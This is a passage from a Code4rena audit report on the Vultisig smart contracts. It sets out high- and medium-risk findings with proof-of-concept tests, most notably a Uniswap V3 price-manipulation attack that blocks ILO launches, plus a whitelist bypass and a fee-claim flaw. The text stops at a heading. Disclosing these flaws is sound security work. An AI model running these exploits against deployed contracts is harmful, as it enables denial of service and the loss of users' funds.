---
sponsor: "Vultisig"
slug: "2024-06-vultisig"
date: "2024-08-05"
title: "Vultisig"
findings: "https://github.com/code-423n4/2024-06-vultisig-findings/issues"
contest: 393
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Vultisig smart contract system written in Solidity. The audit took place between June 14 — June 21, 2024.

## Wardens

70 Wardens contributed reports to Vultisig:

  1. [juancito](https://code4rena.com/@juancito)
  2. [nnez](https://code4rena.com/@nnez)
  3. [iam\_emptyset](https://code4rena.com/@iam_emptyset)
  4. [0xc0ffEE](https://code4rena.com/@0xc0ffEE)
  5. [EPSec](https://code4rena.com/@EPSec) ([petarP1998](https://code4rena.com/@petarP1998) and [1337web3](https://code4rena.com/@1337web3))
  6. [h2134](https://code4rena.com/@h2134)
  7. [Breeje](https://code4rena.com/@Breeje)
  8. [MrPotatoMagic](https://code4rena.com/@MrPotatoMagic)
  9. [chista0x](https://code4rena.com/@chista0x)
  10. [Drynooo](https://code4rena.com/@Drynooo)
  11. [stacey](https://code4rena.com/@stacey)
  12. [rbserver](https://code4rena.com/@rbserver)
  13. [crypticdefense](https://code4rena.com/@crypticdefense)
  14. [Rhaydden](https://code4rena.com/@Rhaydden)
  15. [0x04bytes](https://code4rena.com/@0x04bytes)
  16. [Chinmay](https://code4rena.com/@Chinmay)
  17. [Bigsam](https://code4rena.com/@Bigsam)
  18. [KupiaSec](https://code4rena.com/@KupiaSec)
  19. [tobi0x18](https://code4rena.com/@tobi0x18)
  20. [rspadi](https://code4rena.com/@rspadi)
  21. [jesjupyter](https://code4rena.com/@jesjupyter)
  22. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  23. [bigtone](https://code4rena.com/@bigtone)
  24. [atoko](https://code4rena.com/@atoko)
  25. [cheatc0d3](https://code4rena.com/@cheatc0d3)
  26. [Ryonen](https://code4rena.com/@Ryonen)
  27. [kennedy1030](https://code4rena.com/@kennedy1030)
  28. [Audinarey](https://code4rena.com/@Audinarey)
  29. [HChang26](https://code4rena.com/@HChang26)
  30. [zraxx](https://code4rena.com/@zraxx)
  31. [shaflow2](https://code4rena.com/@shaflow2)
  32. [Nikki](https://code4rena.com/@Nikki)
  33. [araj](https://code4rena.com/@araj)
  34. [0xb0k0](https://code4rena.com/@0xb0k0)
  35. [Utsav](https://code4rena.com/@Utsav)
  36. [hals](https://code4rena.com/@hals)
  37. [hakunamatata](https://code4rena.com/@hakunamatata)
  38. [ke1caM](https://code4rena.com/@ke1caM)
  39. [GEEKS](https://code4rena.com/@GEEKS) ([0xfave](https://code4rena.com/@0xfave) and [SUPERMAN\_I4G](https://code4rena.com/@SUPERMAN_I4G))
  40. [Aymen0909](https://code4rena.com/@Aymen0909)
  41. [carlitox477](https://code4rena.com/@carlitox477)
  42. [light](https://code4rena.com/@light)
  43. [Spearmint](https://code4rena.com/@Spearmint)
  44. [LuarSec](https://code4rena.com/@LuarSec) ([GhK3Ndf](https://code4rena.com/@GhK3Ndf) and [lod1n](https://code4rena.com/@lod1n))
  45. [dimulski](https://code4rena.com/@dimulski)
  46. [Ack](https://code4rena.com/@Ack) ([plotchy](https://code4rena.com/@plotchy), [popular00](https://code4rena.com/@popular00) and [igorline](https://code4rena.com/@igorline))
  47. [bbl4de](https://code4rena.com/@bbl4de)
  48. [robertodf99](https://code4rena.com/@robertodf99)
  49. [4rdiii](https://code4rena.com/@4rdiii)
  50. [Atharv](https://code4rena.com/@Atharv)
  51. [Mj0ln1r](https://code4rena.com/@Mj0ln1r)
  52. [dvrkzy](https://code4rena.com/@dvrkzy)
  53. [0xrugpull\_detector](https://code4rena.com/@0xrugpull_detector)
  54. [0xMAKEOUTHILL](https://code4rena.com/@0xMAKEOUTHILL)
  55. [Shahil\_Hussain](https://code4rena.com/@Shahil_Hussain)
  56. [deepkin](https://code4rena.com/@deepkin)
  57. [Maroutis](https://code4rena.com/@Maroutis)
  58. [0xMosh](https://code4rena.com/@0xMosh)
  59. [lionleo](https://code4rena.com/@lionleo)
  60. [Bob](https://code4rena.com/@Bob)
  61. [leegh](https://code4rena.com/@leegh)
  62. [Hendobox](https://code4rena.com/@Hendobox)
  63. [c-note](https://code4rena.com/@c-note)
  64. [excalibor](https://code4rena.com/@excalibor)
  65. [0xR360](https://code4rena.com/@0xR360)

This audit was judged by [0xsomeone](https://code4rena.com/@0xsomeone).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 6 unique vulnerabilities. Of these vulnerabilities, 3 received a risk rating in the category of HIGH severity and 3 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 5 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Vultisig repository](https://github.com/code-423n4/2024-06-vultisig), and is composed of 22 smart contracts written in the Solidity programming language and includes 1327 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (3)
## [[H-01] Most users won't be able to claim their share of Uniswap fees](https://github.com/code-423n4/2024-06-vultisig-findings/issues/43)
*Submitted by [juancito](https://github.com/code-423n4/2024-06-vultisig-findings/issues/43), also found by [Bigsam](https://github.com/code-423n4/2024-06-vultisig-findings/issues/227), [crypticdefense](https://github.com/code-423n4/2024-06-vultisig-findings/issues/225), [tobi0x18](https://github.com/code-423n4/2024-06-vultisig-findings/issues/216), [rspadi](https://github.com/code-423n4/2024-06-vultisig-findings/issues/215), [Chinmay](https://github.com/code-423n4/2024-06-vultisig-findings/issues/213), [0x04bytes](https://github.com/code-423n4/2024-06-vultisig-findings/issues/211), [KupiaSec](https://github.com/code-423n4/2024-06-vultisig-findings/issues/19), [Audinarey](https://github.com/code-423n4/2024-06-vultisig-findings/issues/226), [h2134](https://github.com/code-423n4/2024-06-vultisig-findings/issues/219), [HChang26](https://github.com/code-423n4/2024-06-vultisig-findings/issues/218), [kennedy1030](https://github.com/code-423n4/2024-06-vultisig-findings/issues/217), [Ryonen](https://github.com/code-423n4/2024-06-vultisig-findings/issues/214), [rbserver](https://github.com/code-423n4/2024-06-vultisig-findings/issues/212), and [shaflow2](https://github.com/code-423n4/2024-06-vultisig-findings/issues/52)*

Users should be able to claim Uniswap fees for their current liquidity position regardless of their pending vestings, or cliff. But most users won't be able to claim those Uniswap fees.

It is also possible that they won't be able to claim their vesting if they accumulate sufficient unclaimed Uniswap fees.

### Vulnerability Details

The root issue is that the `claim()` function collects ALL the owed tokens at once, including the ones from the burnt liquidity, but also the fees corresponding to ALL positions:

```solidity
    (uint128 amountCollected0, uint128 amountCollected1) = pool.collect(
        address(this),
        TICK_LOWER,
        TICK_UPPER,
@>      type(uint128).max,
@>      type(uint128).max
    );
```

<https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L246-L247>

Then the platform fees are sent alongside the Uniswap fees from the users that still didn't claim `amountCollected - amount`:

```solidity
TransferHelper.safeTransfer(_cachedPoolKey.token0, feeTaker, amountCollected0-amount0);
TransferHelper.safeTransfer(_cachedPoolKey.token1, feeTaker, amountCollected1-amount1);
```

<https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L252-L260>

The next time a user calls `claim()`, `pool.collect()` will not contain any Uniswap fees as all of them have already been claimed and sent to the first claimer and the rest to the fee taker. If the platform fees are enough to cover the owed fees for the claiming user, the transaction might succeed (this may be possible if the burnt liquidity is enough).

As time passes, more fees will be accumulated, and when Uniswap fees `>` platform fees, the transaction will also revert even for unclaimed vestings with liquidity to burn. In addition, in most cases after the initial vesting, users won't be able to claim Uniswap fees, as no fees will be collected, and the contract doesn't hold those assets (they have been sent to the fee taker).

### Proof of Concept

This POC shows how after one user claims their share of the fees, there are no more fee tokens to collect for the next claims, and the transactions revert.

1. Add the import to the top of `test/ILOPool.t.sol`.
2. Add the test to the `ILOPoolTest` contract in `test/ILOPool.t.sol`.
3. Run `forge test --mt testClaimFeesRevert`.

```solidity
import '../lib/v3-core/contracts/interfaces/IUniswapV3Pool.sol';
```

```solidity
function testClaimFeesRevert() external {
    _launch();
    vm.warp(VEST_START_0 + 10);

    uint256 tokenId = IILOPool(iloPool).tokenOfOwnerByIndex(INVESTOR, 0);
    uint256 tokenId2 = IILOPool(iloPool).tokenOfOwnerByIndex(INVESTOR_2, 0);

    IUniswapV3Pool uniV3Pool = IUniswapV3Pool(projectId);

    // INVESTOR and INVESTOR_2 burn their liquidity and obtain their tokens

    vm.prank(INVESTOR);
    IILOPool(iloPool).claim(tokenId);

    vm.prank(INVESTOR_2);
    IILOPool(iloPool).claim(tokenId2);

    // Generate some fees via a flash loan
    uniV3Pool.flash(address(this), 1e8, 1e8, "");

    // INVESTOR claims their corresponding part of the fees
    // Only the first one to claim has better odds of claiming successfully
    vm.prank(INVESTOR);
    IILOPool(iloPool).claim(tokenId);

    // INVESTOR_2 can't claim their part of the fees as the transaction will revert
    // It reverts with ST (SafeTransfer) as it is trying to transfer tokens the contract doesn't have
    // The fees for INVESTOR_2 were already taken
    vm.prank(INVESTOR_2);
    vm.expectRevert(bytes("ST"));
    IILOPool(iloPool).claim(tokenId2);

    // Generate more fees
    uniV3Pool.flash(address(this), 1e6, 1e6, "");

    // Even if some new fees are available, they might not be enough to pay back the owed ones to INVESTOR_2
    vm.prank(INVESTOR_2);
    vm.expectRevert(bytes("ST"));
    IILOPool(iloPool).claim(tokenId2);
}

function uniswapV3FlashCallback(uint256, uint256, bytes memory) external {
    deal(USDC, address(this), IERC20(USDC).balanceOf(address(this)) * 2);
    deal(SALE_TOKEN, address(this), IERC20(SALE_TOKEN).balanceOf(address(this)) * 2);

    IERC20(USDC).transfer(projectId, IERC20(USDC).balanceOf(address(this)));
    IERC20(SALE_TOKEN).transfer(projectId, IERC20(SALE_TOKEN).balanceOf(address(this)));
}
```

### Recommended Mitigation Steps

Here's an suggestion on how this could be solved. The idea is to only `collect()` the tokens corresponding to the liquidity of the `tokenId` position. So that the next user can also claim their share.

```diff
    function claim(uint256 tokenId) external payable override isAuthorizedForToken(tokenId)
        returns (uint256 amount0, uint256 amount1)
    {
+       uint128 collect0;
+       uint128 collect1;

        uint128 liquidity2Claim = _claimableLiquidity(tokenId);
        IUniswapV3Pool pool = IUniswapV3Pool(_cachedUniV3PoolAddress);
        {
            IILOManager.Project memory _project = IILOManager(MANAGER).project(address(pool));
            uint128 positionLiquidity = position.liquidity;

            // get amount of token0 and token1 that pool will return for us
            (amount0, amount1) = pool.burn(TICK_LOWER, TICK_UPPER, liquidity2Claim);

+           collect0 = amount0;
+           collect1 = amount1;

            // get amount of token0 and token1 after deduct platform fee
            (amount0, amount1) = _deductFees(amount0, amount1, _project.platformFee);

            ...

            uint256 fees0 = FullMath.mulDiv(
                            feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128,
                            positionLiquidity,
                            FixedPoint128.Q128
                        );
            
            uint256 fees1 = FullMath.mulDiv(
                                feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128,
                                positionLiquidity,
                                FixedPoint128.Q128
                            );

+           collect0 += fees0;
+           collect1 += fees1;

            // amount of fees after deduct performance fee
            (fees0, fees1) = _deductFees(fees0, fees1, _project.performanceFee);

            ...
        }

        (uint128 amountCollected0, uint128 amountCollected1) = pool.collect(
            address(this),
            TICK_LOWER,
            TICK_UPPER,
-           type(uint128).max,
-           type(uint128).max
+           collect0,
+           collect1
        );
        
        ...
    }
```

### Assessed type

Uniswap

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-06-vultisig-findings/issues/43#issuecomment-2237661021):**
 > The Warden outlines an issue with the fee collection mechanism whenever a position is claimed that would result in the contract claiming more funds than the user is due and the fee taker acquiring this difference.
> 
> In turn, this will result in all consequent claim operations of other NFT IDs on the same tick range (i.e., the same pool) to fail potentially permanently due to being unable to capture the fee-related portion. I consider this to be a significant flaw and one that merits a high-risk severity rating.

**[Haupc (Vultisig) confirmed](https://github.com/code-423n4/2024-06-vultisig-findings/issues/43#event-13596542463)**

***

## [[H-02] Vultisig whitelisting can be bypassed by anyone](https://github.com/code-423n4/2024-06-vultisig-findings/issues/42)
*Submitted by [juancito](https://github.com/code-423n4/2024-06-vultisig-findings/issues/42), also found by [h2134](https://github.com/code-423n4/2024-06-vultisig-findings/issues/202), [bbl4de](https://github.com/code-423n4/2024-06-vultisig-findings/issues/196), [robertodf99](https://github.com/code-423n4/2024-06-vultisig-findings/issues/195), [DanielArmstrong](https://github.com/code-423n4/2024-06-vultisig-findings/issues/192), [4rdiii](https://github.com/code-423n4/2024-06-vultisig-findings/issues/186), [Atharv](https://github.com/code-423n4/2024-06-vultisig-findings/issues/181), [Mj0ln1r](https://github.com/code-423n4/2024-06-vultisig-findings/issues/177), [dvrkzy](https://github.com/code-423n4/2024-06-vultisig-findings/issues/171), [Bigsam](https://github.com/code-423n4/2024-06-vultisig-findings/issues/162), [0xrugpull\_detector](https://github.com/code-423n4/2024-06-vultisig-findings/issues/159), [0xMAKEOUTHILL](https://github.com/code-423n4/2024-06-vultisig-findings/issues/155), [Shahil\_Hussain](https://github.com/code-423n4/2024-06-vultisig-findings/issues/151), [0x04bytes](https://github.com/code-423n4/2024-06-vultisig-findings/issues/147), [deepkin](https://github.com/code-423n4/2024-06-vultisig-findings/issues/144), [Utsav](https://github.com/code-423n4/2024-06-vultisig-findings/issues/140), [Nikki](https://github.com/code-423n4/2024-06-vultisig-findings/issues/134), [Maroutis](https://github.com/code-423n4/2024-06-vultisig-findings/issues/129), [EPSec](https://github.com/code-423n4/2024-06-vultisig-findings/issues/128), [kennedy1030](https://github.com/code-423n4/2024-06-vultisig-findings/issues/121), [0xMosh](https://github.com/code-423n4/2024-06-vultisig-findings/issues/116), [lionleo](https://github.com/code-423n4/2024-06-vultisig-findings/issues/115), [Bob](https://github.com/code-423n4/2024-06-vultisig-findings/issues/111), [MrPotatoMagic](https://github.com/code-423n4/2024-06-vultisig-findings/issues/107), [leegh](https://github.com/code-423n4/2024-06-vultisig-findings/issues/102), [Hendobox](https://github.com/code-423n4/2024-06-vultisig-findings/issues/98), [c-note](https://github.com/code-423n4/2024-06-vultisig-findings/issues/91), [excalibor](https://github.com/code-423n4/2024-06-vultisig-findings/issues/193), [0xR360](https://github.com/code-423n4/2024-06-vultisig-findings/issues/164), [araj](https://github.com/code-423n4/2024-06-vultisig-findings/issues/141), and [KupiaSec](https://github.com/code-423n4/2024-06-vultisig-findings/issues/21)*

Whitelist launch will be bricked. Anyone can buy tokens, and also bypass the 3 ETH limit by buying via other non-whitelisted accounts. This will have an impact on price and ruin the opportunities of legit whitelisted users.

[Here's a diagram](https://docs.vultisig.com/vultisig-token/launch#launch-liquidity) on the timelines of the launch. "WL Launch" is the affected phase.

### Vulnerability Details

The `checkWhitelist()` function makes an erroneous check here:

```solidity
    if (_allowedWhitelistIndex == 0 || _whitelistIndex[to] > _allowedWhitelistIndex) {
        revert NotWhitelisted();
    }
```

<https://github.com/code-423n4/2024-06-vultisig/blob/main/hardhat-vultisig/contracts/Whitelist.sol#L216>

`_allowedWhitelistIndex` is the [max index allowed](https://github.com/code-423n4/2024-06-vultisig/blob/main/hardhat-vultisig/contracts/Whitelist.sol#L38-L39), and works as a limit, not a whitelist flag. Once it is set (which must happen for all whitelists), any non-whitelisted user can bypass it. This is because `_whitelistIndex[to]` will be `0`, and `_whitelistIndex[to] > _allowedWhitelistIndex` will never revert (`0 > 1000`, for example).

### Proof of Concept

1. Add this test to `/2024-06-vultisig/hardhat-vultisig/test/unit/Whitelist.ts`.
2. Run the test `npx hardhat test`.

```typescript
it.only("Bypasses whitelisting", async function () {
    const { owner, whitelist, pool, otherAccount, mockOracleSuccess, mockContract } = await loadFixture(deployWhitelistFixture);

    await whitelist.setVultisig(mockContract);
    await whitelist.setLocked(false);
    await whitelist.setOracle(mockOracleSuccess);

    // `otherAccount` is not whitelisted and can't bypass the whitelist check
    await expect(whitelist.connect(mockContract).checkWhitelist(pool, otherAccount, 0)).to.be.revertedWithCustomError(
    whitelist,
    "NotWhitelisted",
    );

    // Until an `_allowedWhitelistIndex` limit is set
    // This value is intended as a limit, not as a flag not allow non-whitelisted users
    await whitelist.setAllowedWhitelistIndex(10);

    // `otherAccount` and any other user can now bypass the whitelisting
    await whitelist.connect(mockContract).checkWhitelist(pool, otherAccount, 0);
});
```

### Recommended Mitigation Steps

Prevent non-whitelisted users to bypass the whitelist:

```diff
-   if (_allowedWhitelistIndex == 0 || _whitelistIndex[to] > _allowedWhitelistIndex) {
+   if (_whitelistIndex[to] == 0 || _whitelistIndex[to] > _allowedWhitelistIndex) {
        revert NotWhitelisted();
    }
```

### Assessed type

Invalid Validation

**[wewecalibrate (Vultisig) confirmed](https://github.com/code-423n4/2024-06-vultisig-findings/issues/42#event-13486594576)**

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-06-vultisig-findings/issues/42#issuecomment-2237655658):**
 > The Warden and its duplicates outline how the whitelist mechanism in the `Whitelist::checkWhitelist` function is invalid and will treat every user as initialized by default.
> 
> I consider a high-risk rating to be appropriate given that this represents an egregious error that affects sensitive functionality of the system.

***

## [[H-03] Adversary can prevent the launch of any ILO pool with enough raised capital at any moment by providing single-sided liquidity](https://github.com/code-423n4/2024-06-vultisig-findings/issues/41)
*Submitted by [juancito](https://github.com/code-423n4/2024-06-vultisig-findings/issues/41), also found by [nnez](https://github.com/code-423n4/2024-06-vultisig-findings/issues/184), [iam\_emptyset](https://github.com/code-423n4/2024-06-vultisig-findings/issues/179), and [0xc0ffEE](https://github.com/code-423n4/2024-06-vultisig-findings/issues/77)*

<https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L296>

### Impact

It is possible to prevent the launch of any ILO pool at any time, including pools that have reached their total raised amount. This can be done at any time and the cost for the attacker is negligible.

Not only this is a DOS of the whole protocol, but the attack can be performed at the very end of the sale, making users lose a lot on gas fees, considering it will be deployed on Ethereum Mainnet. Hundreds or thousands of users will participate in ILO pools via `buy()`, and will have to later call `claimRefund()` to get their "raise" tokens back.

Token launches that were deemed to be successful will be blocked after raising funds from many users, and this will most certainly affect the perception of the token, and its pricing on any attempt of a future launch/sale.

### Vulnerability Details

The `ILOManager` contract has a check to assert that the price at the time of the token launch is the same as the one initialized by the project. If they differ the transaction will revert, and the token launch will fail:

```solidity
function launch(address uniV3PoolAddress) external override {
    require(block.timestamp > _cachedProject[uniV3PoolAddress].launchTime, "LT");
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(uniV3PoolAddress).slot0();
@>  require(_cachedProject[uniV3PoolAddress].initialPoolPriceX96 == sqrtPriceX96, "UV3P");
    address[] memory initializedPools = _initializedILOPools[uniV3PoolAddress];
    require(initializedPools.length > 0, "NP");
    for (uint256 i = 0; i < initializedPools.length; i++) {
        IILOPool(initializedPools[i]).launch();
    }

    emit ProjectLaunch(uniV3PoolAddress);
}
```

<https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L190>

The problem is that `sqrtPriceX96` can be easily manipulated in Uniswap v3 Pools when there is no liquidity in it via a swap with no cost. In theory, this could be mitigated by anyone by swapping back to get back to the original price. But there is an additional problem which makes the severity of the attack even higher. The attacker can add [single-sided liquidity](https://support.uniswap.org/hc/en-us/articles/20902968738317-What-is-single-sided-liquidity#:\~:text=When%20you%20select%20a%20range%20that%20is%20outside%20the%20current%20price%20range%2C%20you%20will%20only%20be%20able%20to%20supply%20one%20of%20the%20two%20tokens.) to the pool (just the Raise Token) after the price was manipulated.

> When you select a range that is outside the current price range, you will only be able to supply one of the two tokens.

By adding liquidity in ticks greater than the manipulated price, but lower than the expected initial price, it would require the swapper to provide some `SALE_TOKEN`, which should not be available at this moment, since they should all be in the ILO pool.

Even if the project admin has some `SALE_TOKEN`, the attacker can mint a higher amount of liquidity by providing more single-sided `RAISE_TOKEN` liquidity, making the needed amount of `SALE_TOKEN` even higher.

### Proof of Concept

The following Proof of Concept shows how an attacker can make a launch revert after raising capital, at the cost of providing liquidity with only `1 wei` of USDC (Raise Token).

Console Output:

    <<Minting Attack>>
    <<Failed mitigation attempt>>
      
    uniswapV3SwapCallback()
      amount0 (USDC)       0
      amount1 (SALE_TOKEN) 1

This would be enough to perform an attack that can't be reverted in most cases since no other sale tokens should be circulating before the launch. But for the sake of interest, the minted liquidity and the mitigation amount can be increased to check the values needed to get back to the initial price in different situations.

POC:

1. Add the import to the top of `test/ILOManager.t.sol`.
2. Add the test to the `ILOManagerTest` contract in `test/ILOManager.t.sol`.
3. Run `forge test --mt testManipulatePriceForLaunch -vv`.

<details>

```solidity
import "../lib/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "forge-std/console.sol";
```

```solidity
function testManipulatePriceForLaunch() external {
    IILOManager.InitPoolParams memory params = _getInitPoolParams();
    _initPool(PROJECT_OWNER, params);

    assertEq(IUniswapV3Pool(projectId).token0(), USDC);
    assertEq(IUniswapV3Pool(projectId).token1(), SALE_TOKEN);

    vm.label(USDC, "USDC");
    vm.label(SALE_TOKEN, "SALE_TOKEN");
    vm.label(projectId, "UNI_V3_POOL");
    vm.label(address(this), "ATTACKER");

    unsuccessfulPriceManipulation();

    priceManipulationAttack();

    vm.warp(LAUNCH_START+1);
    vm.expectRevert(bytes("UV3P"));
    iloManager.launch(projectId);
}

function unsuccessfulPriceManipulation() internal {
    uint160 initialPrice = mockProject().initialPoolPriceX96;
    uint160 MIN_SQRT_RATIO = 4295128739 + 1;

    // Check price before attack
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);

    // Attack
    IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, "");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);

    // Mitigation
    IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, "");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);
}

function priceManipulationAttack() internal {
    uint160 initialPrice = mockProject().initialPoolPriceX96;
    uint160 MIN_SQRT_RATIO = 4295128739 + 1;

    // Check price before attack
    (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), initialPrice);

    // Attack -> Swap to manipulate price
    IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, "");
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);

    // Attack -> Mint to prevent swapping back
    console.log("\n<<Minting Attack>>");
    deal(USDC, address(this), 1);
    int24 OUTSIDE_TICK = 0;
    IUniswapV3Pool(projectId).mint(address(this), OUTSIDE_TICK-10, OUTSIDE_TICK+10, 1, "");

    // Mitigation doesn't work now
    // You can uncomment the `expectRevert` and run the test with `-vvvv`
    // You'll see the log `ATTACKER::uniswapV3SwapCallback(0, 1, 0x)`, which means that it expects 1 wei of SALE_TOKEN
    // This is not possible as all SALE_TOKENs should be in the ILOPool at this moment
    console.log("\n<<Failed mitigation attempt>>");
    vm.expectRevert(bytes("IIA"));
    IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, "");

    // The price will remain the one set by the attacker
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);
}

function uniswapV3MintCallback(uint256, uint256, bytes memory) external {
    IERC20(USDC).transfer(projectId, IERC20(USDC).balanceOf(address(this)));
}

function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory) external {
    assertGe(amount0, 0);
    assertGe(amount1, 0);

    console.log("\nuniswapV3SwapCallback()");
    console.log("amount0 (USDC)      ", uint256(amount0));
    console.log("amount1 (SALE_TOKEN)", uint256(amount1));
}
```

</details>

### Recommended Mitigation Steps

Since the price can be manipulated, and single-sided liquidity can be minted, getting the price back to its initial price would require swapping and providing `SALE_TOKEN`. Since it's an initial sale with vesting for other participants, it is expected that no parties hold the token. But, even if they do, the attack can be performed at some cost anyway as explained before.

So one possible solution could be to reserve some amount in the ILO pool in case it needs to be swapped back, and perform a swap before the liquidity is added to the Uniswap Pool, taking into account an amount that would make the attack very expensive to rollback. Another approach could involve having a wrapper token around the `SALE_TOKEN` that can be minted and swapped to reach the expected price.

This is a potential first step. Additional considerations shall be taken into account, like an attacker minting liquidity on various tick ranges, which may also affect calculations.

### Assessed type

Uniswap

**[Haupc (Vultisig) confirmed](https://github.com/code-423n4/2024-06-vultisig-findings/issues/41#event-13596663998)**

***
 
# Medium Risk Findings (3)
## [[M-01] Vultisig should be burnable](https://github.com/code-423n4/2024-06-vultisig-findings/issues/224)
*Submitted by [EPSec](https://github.com/code-423n4/2024-06-vultisig-findings/issues/224), also found by [h2134](https://github.com/code-423n4/2024-06-vultisig-findings/issues/230), [chista0x](https://github.com/code-423n4/2024-06-vultisig-findings/issues/229), [Drynooo](https://github.com/code-423n4/2024-06-vultisig-findings/issues/228), [stacey](https://github.com/code-423n4/2024-06-vultisig-findings/issues/223), and [MrPotatoMagic](https://github.com/code-423n4/2024-06-vultisig-findings/issues/222)*

The Vultisig token, as described in its documentation, is expected to include a burnable feature. However, the current implementation of the Vultisig token contract lacks the necessary functions to support token burning. This report identifies the impact of this missing functionality and provides a recommended solution to implement the burn feature. The vultisig stated that they forgot to add this functionality.

### Impact

**Non-compliance with Documentation:** Users and developers relying on the documentation will expect burn functionality, leading to confusion and potential loss of trust when they find it missing.

### Proof of concept

As you can see from the code below function for burning is missing, consider adding it to the code.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IApproveAndCallReceiver} from "./interfaces/IApproveAndCallReceiver.sol";

/**
 * @title ERC20 based Vultisig token contract
 */
contract Vultisig is ERC20, Ownable {
    constructor() ERC20("Vultisig Token", "VULT") {
        _mint(_msgSender(), 100_000_000 * 1e18);
    }

    function approveAndCall(
        address spender,
        uint256 amount,
        bytes calldata extraData
    ) external returns (bool) {
        // Approve the spender to spend the tokens
        _approve(msg.sender, spender, amount);

        // Call the receiveApproval function on the spender contract
        IApproveAndCallReceiver(spender).receiveApproval(
            msg.sender,
            amount,
            address(this),
            extraData
        );

        return true;
    }
}
```

### Recommended Mitigation Steps

To address this issue, the following burn functions should be added to the Vultisig contract:
1. **Burn Function:**
    - Allows token holders to destroy a specified amount of their own tokens.
2. **Burn From Function:**
    - Allows an account to burn tokens from another account, given that the caller has sufficient allowance.

Here is the modified contract with the added burn functionality. Something like this can be added to the `Vultisig` code:

```diff
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IApproveAndCallReceiver} from "./interfaces/IApproveAndCallReceiver.sol";

/**
 * @title ERC20 based Vultisig token contract
 */
contract Vultisig is ERC20, Ownable {
    constructor() ERC20("Vultisig Token", "VULT") {
        _mint(_msgSender(), 100_000_000 * 1e18);
    }

    function approveAndCall(
        address spender,
        uint256 amount,
        bytes calldata extraData
    ) external returns (bool) {
        // Approve the spender to spend the tokens
        _approve(msg.sender, spender, amount);

        // Call the receiveApproval function on the spender contract
        IApproveAndCallReceiver(spender).receiveApproval(
            msg.sender,
            amount,
            address(this),
            extraData
        );

        return true;
    }

+    function burn(uint256 amount) public {
+        _burn(msg.sender, amount);
+    }

+    function burnFrom(address account, uint256 amount) public {
+        uint256 currentAllowance = allowance(account, msg.sender);
+        require(currentAllowance >= amount, "ERC20: burn amount exceeds + allowance");
+        _approve(account, msg.sender, currentAllowance - amount);
+        _burn(account, amount);
+    }
}
```

### Assessed type

ERC20

**[0xsomeone (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-06-vultisig-findings/issues/224#issuecomment-2256762782):**
 > Per the original discussions in the validation repository, this finding's set was deemed as a valid medium-risk vulnerability due to being a feature described in the documentation that the Sponsor intends to introduce after the audit. 
> 
> A medium severity was assessed because the functionality is not imperative to the way the protocol works (i.e. all contracts behave "as expected" without it), and burning functionality can be replicated by f.e. transferring funds to the `0xdeaD...DEaD ` address. 

**[Vultisig confirmed](https://github.com/code-423n4/2024-06-vultisig-findings/issues/224#event-13792565095)**

***

## [[M-02] `claim` function lacks slippage controls for `amount0` and `amount1` returned by `pool.burn` function call](https://github.com/code-423n4/2024-06-vultisig-findings/issues/103)
